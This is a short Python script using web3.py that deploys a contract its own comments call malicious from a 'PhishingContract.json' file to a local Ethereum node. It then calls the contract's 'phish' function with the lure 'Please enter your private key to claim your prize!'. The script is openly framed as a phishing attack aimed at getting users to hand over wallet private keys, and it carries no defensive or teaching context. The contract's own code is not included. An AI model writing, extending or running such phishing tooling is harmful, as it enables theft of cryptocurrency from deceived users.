from web3 import Web3
import json

# Connect to Ethereum node
w3 = Web3(Web3.HTTPProvider('http://localhost:8545'))

# Load malicious contract ABI and bytecode
with open('PhishingContract.json') as f:
    contract_data = json.load(f)
malicious_abi = contract_data['abi']
malicious_bytecode = contract_data['bytecode']

# Deploy malicious contract
def deploy_contract(abi, bytecode):
    contract = w3.eth.contract(abi=abi, bytecode=bytecode)
    try:
        # Estimate gas for deployment
        gas_estimate = contract.constructor().estimate_gas()
        tx_hash = contract.constructor().transact({'gas': gas_estimate})
        tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
        print(f"Contract deployed at address: {tx_receipt.contractAddress}")
        return w3.eth.contract(address=tx_receipt.contractAddress, abi=abi)
    except Exception as e:
        print("Failed to deploy contract:", e)
        return None

phishing_contract = deploy_contract(malicious_abi, malicious_bytecode)

# Simulate phishing attack
def perform_phishing_attack(phishing_contract):
    if not phishing_contract:
        print("Contract deployment failed. Exiting attack.")
        return

    try:
        # Send phishing message to users
        phishing_message = "Please enter your private key to claim your prize!"
        tx_hash = phishing_contract.functions.phish(phishing_message).transact()
        w3.eth.wait_for_transaction_receipt(tx_hash)
        
        # Check phishing status
        status = phishing_contract.functions.getStatus().call()
        print(f"Phishing Status: {status}")
    except Exception as e:
        print("Failed to perform phishing attack:", e)

perform_phishing_attack(phishing_contract)
